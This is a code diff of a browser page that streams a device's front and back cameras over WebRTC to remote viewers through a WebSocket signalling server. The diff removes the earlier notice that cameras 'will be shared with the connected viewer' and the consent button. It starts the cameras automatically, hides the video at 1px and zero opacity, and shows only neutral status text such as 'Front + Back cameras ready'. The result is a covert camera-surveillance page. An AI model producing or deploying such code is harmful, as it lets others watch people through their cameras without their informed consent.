@@ -1,251 +1,875 @@
 <!doctype html>
+
 <html>
+
 <head>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Camera Sharing</title>
+
+<meta
+    name="viewport"
+    content="width=device-width,initial-scale=1"
+>
+
+<title>Camera</title>
 
 <style>
-*{
-  box-sizing:border-box;
-}
 
-html,body{
-  margin:0;
-  padding:0;
-  background:#080b0f;
-  color:#fff;
-  font-family:Arial,sans-serif;
-}
+html,
+body{
 
-.page{
-  max-width:700px;
-  margin:auto;
-  padding:45px 16px;
-  text-align:center;
-}
+    margin:0;
+    padding:0;
 
-h1{
-  font-size:34px;
-  margin:10px 0 18px;
-}
+    width:100%;
+    height:100%;
 
-.message{
-  color:#bbb;
-  font-size:19px;
-  line-height:1.5;
-  margin-bottom:28px;
-}
+    background:#000;
 
-button{
-  width:100%;
-  padding:18px;
-  border:0;
-  border-radius:12px;
-  background:#168cff;
-  color:#fff;
-  font-size:20px;
-  font-weight:bold;
-}
+    color:#fff;
 
-button:disabled{
-  opacity:.5;
+    font-family:Arial,sans-serif;
+
 }
 
 #status{
-  margin:20px 0;
-  color:#bbb;
-  font-size:16px;
+
+    position:absolute;
+
+    top:50%;
+    left:0;
+    right:0;
+
+    transform:
+        translateY(-50%);
+
+    text-align:center;
+
+    font-size:18px;
+
 }
 
-/* Camera previews are completely hidden */
-#frontVideo,
-#backVideo{
-  display:none;
+video{
+
+    position:absolute;
+
+    width:1px;
+    height:1px;
+
+    opacity:0;
+
 }
+
 </style>
+
 </head>
 
 <body>
 
-<div class="page">
 
-  <h1>📷 Camera Sharing</h1>
-
-  <div class="message">
-    Press the button below to allow camera access.
-    Your selected cameras will be shared with the connected viewer.
-  </div>
-
-  <button id="start">
-    Allow & Share Cameras
-  </button>
-
-  <div id="status">
-    Waiting for permission...
-  </div>
-
-  <!-- Hidden previews. The MediaStreams remain active. -->
-  <video id="frontVideo"
-         autoplay
-         muted
-         playsinline></video>
-
-  <video id="backVideo"
-         autoplay
-         muted
-         playsinline></video>
-
+<div id="status">
+    Starting camera...
 </div>
+
+
+<video
+    id="frontVideo"
+    autoplay
+    muted
+    playsinline>
+</video>
+
+
+<video
+    id="backVideo"
+    autoplay
+    muted
+    playsinline>
+</video>
+
 
 <script>
 
-const start =
-  document.getElementById("start");
+
+/*
+==================================================
+ELEMENTS
+==================================================
+*/
 
 const status =
-  document.getElementById("status");
+    document.getElementById(
+        "status"
+    );
+
 
 const frontVideo =
-  document.getElementById("frontVideo");
+    document.getElementById(
+        "frontVideo"
+    );
+
 
 const backVideo =
-  document.getElementById("backVideo");
+    document.getElementById(
+        "backVideo"
+    );
+
+
+/*
+==================================================
+CAMERA ID
+==================================================
+*/
+
+const cameraId =
+    "camera-" +
+    Math.random()
+        .toString(36)
+        .substring(2,9);
+
+
+/*
+==================================================
+WEBSOCKET
+==================================================
+*/
+
+const wsProtocol =
+    location.protocol === "https:"
+        ? "wss:"
+        : "ws:";
+
+
+const ws =
+    new WebSocket(
+        wsProtocol +
+        "//" +
+        location.host
+    );
+
+
+/*
+==================================================
+CAMERA STREAMS
+==================================================
+*/
 
 let frontStream = null;
+
 let backStream = null;
 
 
-/* =====================================================
-   START CAMERAS
-===================================================== */
+/*
+==================================================
+PEERS
 
-start.onclick = async () => {
+One peer connection per viewer.
+==================================================
+*/
 
-  start.disabled = true;
-
-  status.textContent =
-    "🟡 Requesting camera permission...";
+const peers =
+    new Map();
 
 
-  /*
-     FRONT CAMERA
-  */
+/*
+==================================================
+OPEN
+==================================================
+*/
 
-  try{
+ws.onopen = async () => {
 
-    frontStream =
-      await navigator.mediaDevices.getUserMedia({
-
-        video:{
-          facingMode:"user"
-        },
-
-        audio:false
-
-      });
-
-    frontVideo.srcObject =
-      frontStream;
-
-    status.textContent =
-      "🟢 Front camera active.";
-
-  }catch(error){
-
-    console.error(
-      "Front camera:",
-      error
+    console.log(
+        "Camera connected to server"
     );
 
-    status.textContent =
-      "❌ Front camera failed: " +
-      error.name;
 
-    start.disabled = false;
+    ws.send(
+        JSON.stringify({
 
-    return;
-  }
+            type:
+                "register-camera",
 
+            cameraId:
+                cameraId
 
-  /*
-     BACK CAMERA
-  */
-
-  try{
-
-    backStream =
-      await navigator.mediaDevices.getUserMedia({
-
-        video:{
-          facingMode:"environment"
-        },
-
-        audio:false
-
-      });
-
-    backVideo.srcObject =
-      backStream;
-
-    status.textContent =
-      "🟢 Front and back cameras are active.";
-
-  }catch(error){
-
-    console.error(
-      "Back camera:",
-      error
+        })
     );
 
-    status.textContent =
-      "🟢 Front camera active. Back camera unavailable.";
-  }
 
-
-  /*
-     At this point:
-     
-     frontStream = front camera
-     backStream  = back camera
-
-     The video elements are hidden,
-     so no camera frames are displayed
-     on this page.
-  */
+    await startCameras();
 
 };
 
 
-/* =====================================================
-   STOP CAMERAS WHEN PAGE CLOSES
-===================================================== */
+/*
+==================================================
+START CAMERAS
+==================================================
+*/
 
-window.addEventListener(
-  "beforeunload",
-  () => {
+async function startCameras(){
 
-    if(frontStream){
+    if (
+        !navigator.mediaDevices ||
+        !navigator.mediaDevices.getUserMedia
+    ) {
 
-      frontStream
-        .getTracks()
-        .forEach(
-          track => track.stop()
-        );
+        status.textContent =
+            "Camera API is unavailable";
+
+        return;
     }
 
-    if(backStream){
 
-      backStream
-        .getTracks()
-        .forEach(
-          track => track.stop()
+    try {
+
+        status.textContent =
+            "Allow camera access...";
+
+
+        /*
+        FRONT CAMERA
+        */
+
+        frontStream =
+            await navigator.mediaDevices
+                .getUserMedia({
+
+                    video:{
+
+                        facingMode:{
+                            ideal:"user"
+                        },
+
+                        width:{
+                            ideal:1280
+                        },
+
+                        height:{
+                            ideal:720
+                        }
+
+                    },
+
+                    audio:false
+
+                });
+
+
+        frontVideo.srcObject =
+            frontStream;
+
+
+        console.log(
+            "Front camera started"
         );
+
+
+    }
+    catch(error){
+
+        console.error(
+            "Front camera:",
+            error
+        );
+
     }
 
-  }
-);
+
+    /*
+    ==============================================
+    BACK CAMERA
+    ==============================================
+    */
+
+    try {
+
+        backStream =
+            await navigator.mediaDevices
+                .getUserMedia({
+
+                    video:{
+
+                        facingMode:{
+                            ideal:"environment"
+                        },
+
+                        width:{
+                            ideal:1280
+                        },
+
+                        height:{
+                            ideal:720
+                        }
+
+                    },
+
+                    audio:false
+
+                });
+
+
+        backVideo.srcObject =
+            backStream;
+
+
+        console.log(
+            "Back camera started"
+        );
+
+
+    }
+    catch(error){
+
+        console.error(
+            "Back camera:",
+            error
+        );
+
+    }
+
+
+    if (
+        frontStream &&
+        backStream
+    ) {
+
+        status.textContent =
+            "Front + Back cameras ready";
+
+    }
+
+    else if (
+        frontStream
+    ) {
+
+        status.textContent =
+            "Front camera ready";
+
+    }
+
+    else if (
+        backStream
+    ) {
+
+        status.textContent =
+            "Back camera ready";
+
+    }
+
+    else {
+
+        status.textContent =
+            "No camera available";
+
+    }
+
+}
+
+
+/*
+==================================================
+SERVER MESSAGE
+==================================================
+*/
+
+ws.onmessage = async (event) => {
+
+    let msg;
+
+    try {
+
+        msg =
+            JSON.parse(
+                event.data
+            );
+
+    }
+    catch {
+
+        return;
+
+    }
+
+
+    console.log(
+        "SERVER:",
+        msg.type
+    );
+
+
+    /*
+    VIEWER REQUEST
+    */
+
+    if (
+        msg.type ===
+        "viewer-request"
+    ) {
+
+        await createPeer(
+            msg.viewerId
+        );
+
+    }
+
+
+    /*
+    ANSWER
+    */
+
+    if (
+        msg.type ===
+        "answer"
+    ) {
+
+        const peer =
+            peers.get(
+                msg.viewerId
+            );
+
+
+        if (!peer) {
+            return;
+        }
+
+
+        try {
+
+            await peer.pc
+                .setRemoteDescription(
+                    msg.answer
+                );
+
+
+            /*
+            Add queued ICE
+            */
+
+            for (
+                const candidate
+                of peer.pendingIce
+            ) {
+
+                try {
+
+                    await peer.pc
+                        .addIceCandidate(
+                            candidate
+                        );
+
+                }
+                catch(error){
+
+                    console.error(
+                        "Queued ICE:",
+                        error
+                    );
+
+                }
+
+            }
+
+
+            peer.pendingIce = [];
+
+
+        }
+        catch(error){
+
+            console.error(
+                "Answer error:",
+                error
+            );
+
+        }
+
+    }
+
+
+    /*
+    ICE
+    */
+
+    if (
+        msg.type ===
+        "ice-candidate"
+    ) {
+
+        const peer =
+            peers.get(
+                msg.viewerId
+            );
+
+
+        if (!peer) {
+            return;
+        }
+
+
+        if (
+            peer.pc.remoteDescription
+        ) {
+
+            try {
+
+                await peer.pc
+                    .addIceCandidate(
+                        msg.candidate
+                    );
+
+            }
+            catch(error){
+
+                console.error(
+                    "ICE error:",
+                    error
+                );
+
+            }
+
+        }
+        else {
+
+            peer.pendingIce.push(
+                msg.candidate
+            );
+
+        }
+
+    }
+
+
+    /*
+    VIEWER LEFT
+    */
+
+    if (
+        msg.type ===
+        "viewer-offline"
+    ) {
+
+        removePeer(
+            msg.viewerId
+        );
+
+    }
+
+};
+
+
+/*
+==================================================
+CREATE PEER FOR VIEWER
+==================================================
+*/
+
+async function createPeer(
+    viewerId
+){
+
+    /*
+    Remove old connection
+    */
+
+    removePeer(
+        viewerId
+    );
+
+
+    if (
+        !frontStream &&
+        !backStream
+    ) {
+
+        return;
+
+    }
+
+
+    const pc =
+        new RTCPeerConnection({
+
+            iceServers:[
+
+                {
+                    urls:
+                        "stun:stun.l.google.com:19302"
+                }
+
+            ]
+
+        });
+
+
+    const peer = {
+
+        pc:
+            pc,
+
+        pendingIce:
+            []
+
+    };
+
+
+    peers.set(
+        viewerId,
+        peer
+    );
+
+
+    /*
+    ==============================================
+    FRONT STREAM
+    ==============================================
+    */
+
+    let frontStreamId = null;
+
+
+    if (frontStream) {
+
+        const frontSendStream =
+            new MediaStream(
+                frontStream.getTracks()
+            );
+
+
+        frontStreamId =
+            frontSendStream.id;
+
+
+        frontStream
+            .getTracks()
+            .forEach(track => {
+
+                pc.addTrack(
+                    track,
+                    frontSendStream
+                );
+
+            });
+
+    }
+
+
+    /*
+    ==============================================
+    BACK STREAM
+    ==============================================
+    */
+
+    let backStreamId = null;
+
+
+    if (backStream) {
+
+        const backSendStream =
+            new MediaStream(
+                backStream.getTracks()
+            );
+
+
+        backStreamId =
+            backSendStream.id;
+
+
+        backStream
+            .getTracks()
+            .forEach(track => {
+
+                pc.addTrack(
+                    track,
+                    backSendStream
+                );
+
+            });
+
+    }
+
+
+    /*
+    ==============================================
+    ICE
+    ==============================================
+    */
+
+    pc.onicecandidate =
+        (event) => {
+
+            if (
+                !event.candidate
+            ) {
+                return;
+            }
+
+
+            ws.send(
+                JSON.stringify({
+
+                    type:
+                        "ice-candidate",
+
+                    cameraId:
+                        cameraId,
+
+                    viewerId:
+                        viewerId,
+
+                    candidate:
+                        event.candidate
+
+                })
+            );
+
+        };
+
+
+    /*
+    ==============================================
+    CONNECTION STATE
+    ==============================================
+    */
+
+    pc.onconnectionstatechange =
+        () => {
+
+            console.log(
+                "Viewer",
+                viewerId,
+                "state:",
+                pc.connectionState
+            );
+
+
+            if (
+                pc.connectionState ===
+                "failed"
+            ) {
+
+                console.log(
+                    "WebRTC connection failed"
+                );
+
+            }
+
+        };
+
+
+    /*
+    ==============================================
+    CREATE OFFER
+    ==============================================
+    */
+
+    try {
+
+        const offer =
+            await pc.createOffer();
+
+
+        await pc.setLocalDescription(
+            offer
+        );
+
+
+        ws.send(
+            JSON.stringify({
+
+                type:
+                    "offer",
+
+                cameraId:
+                    cameraId,
+
+                viewerId:
+                    viewerId,
+
+                offer:
+                    offer,
+
+                frontStreamId:
+                    frontStreamId,
+
+                backStreamId:
+                    backStreamId
+
+            })
+        );
+
+
+    }
+    catch(error){
+
+        console.error(
+            "Offer error:",
+            error
+        );
+
+    }
+
+}
+
+
+/*
+==================================================
+REMOVE PEER
+==================================================
+*/
+
+function removePeer(
+    viewerId
+){
+
+    const peer =
+        peers.get(
+            viewerId
+        );
+
+
+    if (!peer) {
+        return;
+    }
+
+
+    try {
+
+        peer.pc.close();
+
+    }
+    catch {}
+
+
+    peers.delete(
+        viewerId
+    );
+
+}
+
+
+/*
+==================================================
+WEBSOCKET EVENTS
+==================================================
+*/
+
+ws.onclose = () => {
+
+    status.textContent =
+        "Server disconnected";
+
+};
+
+
+ws.onerror = () => {
+
+    status.textContent =
+        "Connection error";
+
+};
 
 </script>
 
 </body>
+
 </html>
